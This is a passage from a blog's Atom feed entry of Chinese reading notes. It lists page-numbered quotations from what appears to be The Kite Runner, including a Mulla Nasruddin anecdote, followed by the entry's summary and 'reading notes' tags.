至视为必须。我们总是说，生活会继续。但我在这里，没有向命运投降……–196</li><li>只有你想做和不想做的事情罢了。-196</li><li>得到了再失去，总是比从来没有得到的更伤人。–206</li><li>时间很贪婪，有时候，它会独自吞噬所有的细节。–208<br>39一个不能为自己挺身而出的孩子，长大后只能是个懦夫。–214</li><li>A season for Ashens（此情可待成追忆）–228</li><li>将一把皱巴巴的钞票塞在草席下面。–234</li><li>战争把父亲变成阿富汗稀缺的物品。–237</li><li>页面破损怎么办( •̥́ ˍ •̀ू )</li><li>纳斯鲁丁毛拉的故事：<br>他女儿回家，抱怨丈夫打了她，纳斯鲁丁也揍了她，然后让她回家告诉她丈夫，说毛拉不是蠢货：如果哪个混蛋胆敢揍我女儿，毛拉会揍她妻子以报复。<br>有一次毛拉骑着他的驴子，肩膀上扛着一个重重的袋子。有个路人问，你为什么不把袋子放在驴背上呢？他说：那太残忍了，我已经压得这可怜的东西不堪重负。<br>–257</li><li>为你，千千万万遍。法里德说。–294</li><li>是时间让你忘记的。–306</li><li>阿富汗有很多儿童，但没有童年。–306</li><li>你愿意到美国去，跟我和我的妻子一起生活吗？–309</li><li>认输简直就像在女童军的柠檬水罐里面尿尿一样不可原谅。–328</li><li>孩子们就是这样对付恐惧：他们睡觉。–332</li><li>每一块都让人想起生活原本应该是另外一种样子，让人想起那个尚未盛开就已经凋谢的梦。</li><li>为你，千千万万遍。–359</li><li>也许每个人心中都有一个风筝，无论它意味着什么，让我们勇敢地追。–362</li></ol>]]></content>
    
    <summary type="html">
    
      借朋友的一本书，觉得一些句子很有意思，记录一下
    
    </summary>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
